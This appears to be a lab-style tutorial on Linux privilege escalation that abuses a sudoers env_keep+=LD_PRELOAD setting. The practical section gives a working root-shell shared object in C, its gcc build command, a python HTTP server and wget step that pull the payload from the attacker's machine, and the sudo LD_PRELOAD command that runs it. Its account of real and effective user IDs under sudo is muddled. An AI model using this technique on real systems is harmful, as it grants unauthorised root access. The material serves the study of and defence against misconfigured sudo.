# Background on Sudo

Sudo allows access to restricted files by temporarily elevating the privileges of the user to the `root` user. Sudo was introduced as a safer way to elevate privileges by mitigating the risks associated with unrestricted access to the root account by only executing the command as the root user.

For users to use the `sudo` command, they must be in the sudoers file located at /etc/sudoers. To edit the sudoers file, you should use the following command to open the file with 'visudo' which parses the file for syntax errors.
```
sudo visudo
```

To add or remove accounts from the sudoers file, the user has to be in the sudo group which can be arranged by using the command:

```
sudo usermod -aG sudo [username]
```

You can check your user's privileges by running the command: `sudo -l`

```
Matching Defaults entries for kayem on kali:
    env_reset, env_keep+=LD_PRELOAD

User kayem may run the following commands on kali:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

`env_reset` is an option that defaults environment variables before running the command as root, unless the environment variable is added to the list of preserved variables with the `env_keep` option. In the example above, we can see that the `LD_PRELOAD` environment variable is retained when resetting the environment.

To restrict `LD_PRELOAD` from loading in arbitrary shared libraries, dynamic linkers ignore the environment variable if the real user ID (ruid) is different to the effective user ID (uid). The real user ID represents the user who executed the sudo command and the effective user ID represents the user ID under which the process is running. For instance, when running processes with sudo, the ruid will be 1000 but the uid will be 0 (root) so the environment variable will be ignored. 

# Practical

Using the `sudo -l` command, I discover that the user `kayem` has access to three programs: find, less, and nano. We can abuse the `LD_PRELOAD` environment variable by uploading the following C program to spawn a root shell.

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```
The program can then be compiled into an object file with the following gcc command:
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
Once compiled, we can host a python3 HTTP server to transfer the object file from our machine to the target machine. We can start an HTTP server with the command:
```
sudo python3 -m http.server 8000
```
And download the file on our target machine.
```
wget http://[IP address]:8000/shell.so
```

Finally, we run the following command to spawn our root shell.

```
sudo LD_PRELOAD=/home/kayem/shell.so find
```

This command runs the "find" program with sudo rights so thus the whole command is run with sudo rights and then the LD_PRELOAD environmental variable is set to the specified path.
